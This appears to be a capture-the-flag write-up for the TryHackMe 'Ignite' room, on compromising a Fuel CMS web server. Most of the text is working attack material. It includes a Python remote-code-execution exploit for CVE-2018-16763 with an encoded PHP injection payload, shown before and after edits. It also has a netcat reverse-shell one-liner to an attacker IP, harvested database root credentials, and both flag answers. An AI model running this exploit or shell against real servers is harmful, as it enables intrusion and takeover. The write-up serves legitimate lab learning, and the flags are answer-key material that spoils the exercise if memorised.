###### A new start-up has a few issues with their web server.
Room: https://tryhackme.com/room/ignite
##

The only port open is port 80, running a HTTP server.  
However, once we navigate to the website we see that it's under construction, or at least, not fully configured.  

**gobuster dir -u http://xx.xx.xxx.xxx/ --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 300

This way, we're able to find the **/fuel** directory. Once we run gobuster again, we find plenty other interesting subdirectories.  
The one that matters is the **/fuel/login**.  

Since this is not properly configured, I tried admin:admin, hoping for default credentials. And it worked!  
I used the CVE-2018-16763 ([link](https://www.exploit-db.com/exploits/47138)) to exploit the CMS. 

However, it doesn't seem to work out of the box, so I made a few changes to it.  
**default code**
```
import requests
import urllib

url = "http://127.0.0.1:8881"
def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start

while 1:
	xxxx = raw_input('cmd:')
	burp0_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.quote(xxxx)+"%27%29%2b%27"
	proxy = {"http":"http://127.0.0.1:8080"}
	r = requests.get(burp0_url, proxies=proxy)

	html = "<!DOCTYPE html>"
	htmlcharset = r.text.find(html)

	begin = r.text[0:20]
	dup = find_nth_overlapping(r.text,begin,2)

	print r.text[0:dup]
```

**edited code**
```
import requests
import urllib

url = "http://xx.xx.xxx.xxx:80"
def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start

while 1:
	xxxx = raw_input('cmd:')
	burp0_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.quote(xxxx)+"%27%29%2b%27"
	r = requests.get(burp0_url)

	html = "<!DOCTYPE html>"
	htmlcharset = r.text.find(html)

	begin = r.text[0:20]
	dup = find_nth_overlapping(r.text,begin,2)

	print r.text[0:dup]
```
Running the script, we see that we're able to run a simple command. 
```
cmd:whoami
systemwww-data
```

However, we might be able to get the flags from this stage. But let's create a reverse shell and exploit the system as much as we can.  
```
cmd:rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc xx.x.x.xxx 5555 >/tmp/f 
```

**The first flag is located at /home/www-data/flag.txt and is 6470e394cbf6dab6a91682cc8585059b** **[1]**.   

We don't have access to the root directory, so I was thinking if we can find some valuable information in the **Fuel's CMS** files.  
If we navigate to **/var/www/html/fuel**, we find all the files of the CMS.   

However, in the /var/www/html/fuel/application/config we see a file called **database.php**.
```
'username' => 'root',
'password' => 'mememe',
```

**The second and final flag is at /root/root.txt and is b9bbcb33e11b80be759c4e844862482d** **[2]**.  

